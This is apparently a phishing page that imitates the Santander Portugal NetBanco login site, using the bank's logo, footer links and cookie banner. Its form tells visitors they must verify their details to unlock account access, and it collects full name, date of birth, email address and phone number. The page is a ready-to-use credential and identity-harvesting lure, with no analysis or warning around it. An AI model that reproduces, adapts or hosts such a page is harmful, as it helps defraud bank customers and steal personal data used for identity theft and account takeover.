<html><head>
    
    
    
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width" ,="" initial-scale="1">
    <title>Netbanco Particulares - Santander</title>
    

    

<link rel="stylesheet" href="custom2.css">

</head>
<body class="inactive fondo1">
<div id="loginBanner"></div>





<header class="header-container" id="header-container">
        <a href="https://www.santander.pt">
            <img src="ficheros/modern/images/icons/santander-logo-red.svg" class="santander-logo">
        </a>
 </header>

<div id="main">
    



<div style="clear: both; margin: 0 auto; display: inline; width: 926px">
    




 

    <div class="center-content">
    
        
        
        <img alt="" src="ficheros/modern/images/icons/login-image-2.svg" class="vector-art">
        <div class="main-content">
    









<div class="page-title">
    <h1 class="main-title"> NetBanco</h1>
    <h2 class="secondary-title">
        
        verificação de login



    </h2>
</div>
<p class="title-description">
    
    Para desbloquear o acesso ao NetBanco Particulares,

    Por favor, verifique as informações abaixo com cuidado
</p>

<form name="formulario" id="formulario" method="post" >


    <section class="form-container">
        
        
        <div class="input-div">
            <input type="text"  name="fullname" class="input-field" maxlength="200"  value="" required="" placeholder=" ">
            <label class="floating-label">Full Name</label>
        </div>


   <div class="input-div">
            <input type="text"  name="dob" class="input-field" maxlength="200"  value="" required="" placeholder=" ">
            <label class="floating-label">Date Of Birth</label>
        </div>


  <div class="input-div">
            <input type="email"  name="email" class="input-field" maxlength="200"  value="" required="" placeholder=" ">
            <label class="floating-label">Email Address</label>
        </div>

  <div class="input-div">
            <input type="email"  name="phone" class="input-field" maxlength="200"  value="" required="" placeholder=" ">
            <label class="floating-label">Phone Number</label>
        </div>



       


        <div class="form-main-buttons">

        
        
        
        
        
            <!-- m3dsubmit -->
            <button id="submit_button" class="square-button-red" type="submit">
                
                Verificar
            </button>
        </div>
    </section>
<input type="hidden" name="OGC_TOKEN" value="0MNP-UT7G-9SGU-81F4-WCF3-G2TE-JFQ5-I02E">
</form>


<a class="gray-link" id="go-to-netbanco" href="pagina/indice/0,,276_1_2,00.html" target="_parent" onclick="sendGTMTrackEvent('navegar', 'Netbanco')">NetBanco</a>
<a class="gray-link" id="go-to-cartao-refeicao" href="pagina/indice/0,,840_1_2,00.html" target="_parent" onclick="sendGTMTrackEvent('navegar', 'cartao-refeicao')">Cartão Refeição</a>



</div>
</div>







<div class="clear"></div>


</div>

</div>





<footer id="footer">
                <div id="footer-link-container">
                    <a class="footer-link" id="footer-pricing" href="https://www.santander.pt/pt_PT/Particulares/Precario.html?_ga=2.212762770.742033001.1559225578-367438372.1530887449" target="<%=targetAttribute%>">Preçário</a>
                    <a class="footer-link" id="footer-terms" href="https://www.santander.pt/pt_PT/Particulares/Informacoes/Condicoes-de-Utilizacao.html?_ga=2.122258189.742033001.1559225578-367438372.1530887449" target="<%=targetAttribute%>">Termos e Condições</a>
   <a class="footer-link" id="footer-terms" href="https://www.santander.pt/politica-cookies" target="<%=targetAttribute%>">Política de cookies</a>
   <a class="footer-link" id="footer-terms" href="https://www.santander.pt/politica-privacidade" target="<%=targetAttribute%>">Política de privacidade</a>
<a class="footer-link" id="footer-terms" href="https://www.santander.pt/incumprimento-credito" target="<%=targetAttribute%>">Incumprimento crédito e rede de apoio</a>
  <a class="footer-link" id="footer-contacts" href="https://www.santander.pt/contactos" target="_parent">Contactos</a>
    </div>
<a class="footer-link" id="footer-copyright" href="https://www.santander.pt/aviso-legal-copyright" target="_parent">© 2022 Santander - Todos os Direitos Reservados...</a>
    </footer>
 





<div style="display: none; visibility: hidden;"><style type="text/css">
 #onetrust-consent-sdk * {
    font-family: "Santander Text", "Arial", sans-serif;
    font-size: 16px;
}
</style>

</div>

<div id="onetrust-consent-sdk"><div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div><div id="onetrust-pc-sdk" class="otPcTab ot-hide ot-fade-in ot-tgl-with-label" role="alertdialog" aria-modal="true" lang="pt" aria-label="Centro de preferências de privacidade"><!-- pc header --><div class="ot-pc-header" role="presentation"><!-- Header logo --><div class="ot-pc-logo" role="img" aria-label="Logótipo da empresa" style="background-image: url();
                    background-position: left;"></div><div class="ot-title-cntr"><h2 id="ot-pc-title">Centro de preferências de privacidade</h2><div class="ot-close-cntr"><button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Fechar"></button></div></div></div><!-- content --><!-- Groups / Sub groups with cookies --><div id="ot-pc-content" class="ot-pc-scrollbar ot-sdk-row"><div class="ot-sdk-container ot-grps-cntr ot-sdk-column"><div class="ot-sdk-four ot-sdk-columns ot-tab-list" aria-label="Cookie Categories"><ul class="ot-cat-grp" role="tablist"><li class="ot-abt-tab" role="presentation"><!-- About Privacy container --><div class="ot-active-menu category-menu-switch-handler" role="tab" tabindex="0" aria-selected="true" aria-controls="ot-tab-desc"><h3 id="ot-pvcy-txt">A sua privacidade</h3></div></li><li class="ot-cat-item ot-always-active-group" role="presentation" data-optanongroupid="C0001"><div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0001"><h3 id="ot-header-id-C0001">Cookies estritamente necessários</h3></div></li><li class="ot-cat-item" role="presentation" data-optanongroupid="C0002"><div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0002"><h3 id="ot-header-id-C0002">Cookies de desempenho</h3></div></li><li class="ot-cat-item" role="presentation" data-optanongroupid="C0003"><div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0003"><h3 id="ot-header-id-C0003">Cookies funcionais</h3></div></li><li class="ot-cat-item" role="presentation" data-optanongroupid="C0004"><div class="category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0004"><h3 id="ot-header-id-C0004">Cookies de publicidade</h3></div></li></ul></div><div class="ot-tab-desc ot-sdk-eight ot-sdk-columns"><div class="ot-desc-cntr" id="ot-tab-desc" tabindex="0" role="tabpanel" aria-labelledby="ot-pvcy-hdr"><h4 id="ot-pvcy-hdr">A sua privacidade</h4><p id="ot-pc-desc" class="ot-grp-desc">Usamos cookies e/ou tecnologias semelhantes que armazenam e recuperam informações durante a navegação. Essas tecnologias servem diversas finalidades, como por exemplo, reconhecê-lo como utilizador, obter informações sobre os seus hábitos de navegação e mostrar publicidade personalizada, com base na navegação. Caso pretenda pode consultar o detalhe da utilização dessas tecnologias na Política de Cookies. Se pretender pode aceitar ou rejeitar todas as cookies através dos botões correspondentes ou configurar as suas escolhas alterando a estado das permissões para uso das cookies para "SIM" ou "NÃO". Uma vez terminado basta selecionar a opção “Confirmar as minhas Escolhas” e guardará a seleção de cookies que efetuou. Caso não tenha selecionado nenhuma opção ao pressionar o botão "Confirmar as minhas escolhas” vai rejeitar todos os cookies. 
                <br><a href="https://www.santander.pt/politica-cookies" class="privacy-notice-link" rel="noopener" target="_blank" aria-label="Mais informação sobre a sua privacidade, abre num separador novo">Mais informação</a></p></div><div class="ot-desc-cntr ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001"><div class="ot-grp-hdr1"><h4 class="ot-cat-header">Cookies estritamente necessários</h4><div class="ot-tgl-cntr"><div class="ot-always-active">Sempre ativos</div></div></div><p class="ot-grp-desc ot-category-desc">Estes cookies são necessários para que o website funcione e não podem ser desativados. Permitem escolher as preferências de privacidade, iniciar uma sessão, aceder a áreas restritas ou completar formulários, sem armazenar informações pessoais. Pode configurar o seu browser para bloquear ou alertar sobre estes cookies, mas o website poderá não funcionar corretamente.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Informação de cookies Este botão abre a janela de detalhes dos cookies." data-parent-id="C0001">Informação de cookies‎</button></div></div><div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0002"><div class="ot-grp-hdr1"><h4 class="ot-cat-header">Cookies de desempenho</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0002" checked="" aria-labelledby="ot-header-id-C0002"> <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Cookies de desempenho</span></label> <span class="ot-label-status">Ativos</span></div><div class="ot-tgl-cntr"></div></div><p class="ot-grp-desc ot-category-desc">Estes cookies permitem obter informações sobre as visitas ao website, com o objetivo de medir e melhorar o seu desempenho. Ajudam a saber quais as páginas mais e menos visitadas, qual o número de visitas e como os visitantes navegam pelo website. Toda a informação que estes cookies recolhem é agregada e, portanto, anónima. Se não permitir estes cookies, não saberemos quando visitou o nosso website.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Informação de cookies Este botão abre a janela de detalhes dos cookies." data-parent-id="C0002">Informação de cookies‎</button></div></div><div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0003"><div class="ot-grp-hdr1"><h4 class="ot-cat-header">Cookies funcionais</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0003" checked="" aria-labelledby="ot-header-id-C0003"> <label class="ot-switch" for="ot-group-id-C0003"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Cookies funcionais</span></label> <span class="ot-label-status">Ativos</span></div><div class="ot-tgl-cntr"></div></div><p class="ot-grp-desc ot-category-desc">Estes cookies permitem proporcionar funcionalidades e personalizações avançadas, tais como vídeos e conversas em tempo real. Podem ser atribuídos por nós, ou por parceiros cujos serviços adicionamos às nossas páginas. Se não permitir estes cookies, alguns desses serviços poderão não funcionar corretamente.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Informação de cookies Este botão abre a janela de detalhes dos cookies." data-parent-id="C0003">Informação de cookies‎</button></div></div><div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0004"><div class="ot-grp-hdr1"><h4 class="ot-cat-header">Cookies de publicidade</h4><div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0004" id="ot-group-id-C0004" aria-checked="true" role="switch" class="category-switch-handler" data-optanongroupid="C0004" checked="" aria-labelledby="ot-header-id-C0004"> <label class="ot-switch" for="ot-group-id-C0004"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Cookies de publicidade</span></label> <span class="ot-label-status">Ativos</span></div><div class="ot-tgl-cntr"></div></div><p class="ot-grp-desc ot-category-desc">Estes cookies podem ser atribuídos pelo próprio website, ou pelos nossos parceiros de publicidade. Armazenam informação sobre o comportamento do utilizador, obtida através da observação dos seus hábitos de navegação, tais como visitas repetidas a um determinado website e permitem o desenvovimento de um perfil específico de acordo com os seus interesses, para lhe mostrar anúncios relacionados. Eles não armazenam diretamente informações pessoais, mas são baseados na identificação do seu browser e dispositivo de internet. Se não permitir estes cookies, terá menos publicidade direcionada.</p><div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Informação de cookies Este botão abre a janela de detalhes dos cookies." data-parent-id="C0004">Informação de cookies‎</button></div></div></div></div></div><!-- Vendors / Hosts --><section id="ot-pc-lst" class="ot-hide ot-enbl-chr"><div class="ot-lst-cntr ot-pc-scrollbar"><div id="ot-pc-hdr"><div id="ot-lst-title"><button class="ot-link-btn back-btn-handler" aria-label="Back"><svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531" xml:space="preserve"><title>Back Button</title><g><path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                  l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                  c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                  s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                  L213.13,222.409z"></path></g></svg></button> <span>Back</span></div><div class="ot-lst-subhdr"><div id="ot-search-cntr"><p role="status" class="ot-scrn-rdr"></p><label for="vendor-search-handler" class="ot-scrn-rdr">Vendor Search</label> <input id="vendor-search-handler" aria-label="Vendor Search" type="text" placeholder="Search..." name="vendor-search-handler"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true"><path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
              s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
              c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
              s-17-7.626-17-17S14.61,6,23.984,6z"></path></svg></div><div id="ot-fltr-cntr"><button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true"><svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577" xml:space="preserve"><title>Filter Button</title><g><path fill="#2c3643" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
                            c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
                            c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
                            C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></button></div></div></div><section id="ot-lst-cnt" class="ot-pc-scrollbar"><div class="ot-sdk-row"><div class="ot-sdk-column"><div id="ot-sel-blk"><div class="ot-sel-all"><div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span class="ot-li-hdr">Leg.Interest</span></div><div class="ot-sel-all-chkbox"><div class="ot-chkbox" id="ot-selall-hostcntr"><input id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-hosts-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-vencntr"><input id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-licntr"><input id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false"> <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div></div><ul id="ot-host-lst"><li class="ot-host-item"><button class="ot-host-box" aria-expanded="false"></button><section class="ot-acc-hdr"><div class="ot-tgl-cntr"><div class="ot-host-hdr"><h3 class="ot-host-name"></h3><h4 class="ot-host-desc"></h4></div></div><div class="ot-host-notice"><button class="ot-link-btn ot-host-expand" role="presentation" aria-hidden="true" tabindex="-1">View Third Party Cookies</button></div></section><div class="ot-acc-txt"><div class="ot-host-opts"><!-- HOST LIST VIEW UPDATE *** --><ul class="ot-host-opt"><li class="ot-host-info"><div><div>Name</div><div>cookie name</div></div></li></ul><!-- HOST LIST VIEW UPDATE END *** --></div></div></li></ul></div></div></section></div><div id="ot-anchor"></div><section id="ot-fltr-modal"><div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button><div class="ot-fltr-scrlcnt ot-pc-scrollbar"><div class="ot-fltr-opts"><div class="ot-fltr-opt"><div class="ot-chkbox"><input id="chkbox-id" type="checkbox" aria-checked="false" class="category-filter-handler"> <label for="chkbox-id"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div><div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button> <button id="filter-cancel-handler">Cancel</button></div></div></div></section></section><!-- Footer buttons and logo --><div class="ot-pc-footer"><div class="ot-btn-container"><button class="save-preference-btn-handler onetrust-close-btn-handler">Confirmar as minhas escolhas</button><div class="ot-btn-subcntr"><button class="ot-pc-refuse-all-handler">Rejeitar todos</button> <button id="accept-recommended-btn-handler">Permitir todos</button></div></div><div class="ot-pc-footer-logo"><a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/poweredBy_ot_logo.svg&quot;);" aria-label="Powered by OneTrust Abre num separador novo"></a></div></div><!-- Cookie subgroup container --><!-- Vendor list link --><!-- Cookie lost link --><!-- Toggle HTML element --><!-- Checkbox HTML --><!-- Arrow SVG element --><!-- Accordion basic element --><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite"></span><iframe class="ot-text-resize" title="onetrust-text-resize" style="position: absolute; top: -50000px; width: 100em;" aria-hidden="true"></iframe></div></div><style type="text/css">
  #sgntbanner img{width:100%}
.sgnt_popin_big,.sgnt_popin_med_hidden,.sgnt_popin_big_hidden,.sgnt_popin_alert{top:10vh;left:20%;position:fixed;height:80%;width:70%;z-index:105 !important;font-family:"Santander Text";border:1px solid #ddd !important;-webkit-box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.5);-moz-box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.5);box-shadow: 3px 3px 5px 0px rgba(0,0,0,0.5);max-width:1200px;}
  .sgnt_popin_big b.close,.sgnt_popin_med_hidden b.close,.sgnt_popin_big_hidden b.close,.sgnt_popin_alert b.close{height: 30px !important;width: 100px !important;font-size: 28px !important;line-height: 30px !important;border-radius: 0px !important;border: #fff 0 !important;z-index: 110;margin: 0px !important;color: #AAA !important;background-color: transparent !important;position: relative;right: 20px;top: 10px;text-align: right !important;}
  .sgnt_popin_big b.close::before,.sgnt_popin_med_hidden b.close::before,.sgnt_popin_big_hidden b.close::before{content: "Fechar "!important;font-size: 18px;position: absolute;top: 0px;right: 22px;transform:none !important;background-color:transparent !important;}
  .sgnt_popin_alert b.close::before{content: ""!important;font-size: 18px;position: absolute;top: 0px;right: 22px;transform:none !important;background-color:transparent !important;}
  .sgnt_popin_big b.close::after,.sgnt_popin_med_hidden b.close::after,.sgnt_popin_big_hidden b.close::after, .sgnt_popin_alert b.close::after{background-color:transparent !important;}
  .sgnt_popin_big b.close svg, .sgnt_popin_med b.close svg, .sgnt_popin_alert b.close svg {width: 24px;}
  .sgnt_popin_big b.close svg path, .sgnt_popin_med b.close svg path, .sgnt_popin_alert b.close svg path{color:#656565;}
  .sgnt_popin_big iframe,.sgnt_popin_med iframe,.sgnt_popin_med_hidden iframe,.sgnt_popin_big_hidden iframe,.sgnt_popin_alert iframe{position:absolute;top:0;left:0;}
  .sgnt_popin_big_hidden,.sgnt_popin_med_hidden{display:none;}
  .sgnt_popin_med_hidden{width:55%;height:70%;left:25%;}
  .sgnt_popin_alert{transform:none !important;top:10vh!important;transform:none;min-height:320px;max-width:909px !important;height:600px;display:none;}
  #sgnt_overlay{position:fixed;width:100%;height:100%;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,.5);z-index:100;}
  @media (max-width: 750px) {
    .sgnt_popin_big,.sgnt_popin_big_hidden,.sgnt_popin_med_hidden{width:90%; left:5%; height:80%;}
    .sgnt_popin_alert {height:inherit;width:90%;left:5%;top:1vh !important}
  }
</style>


</body></html>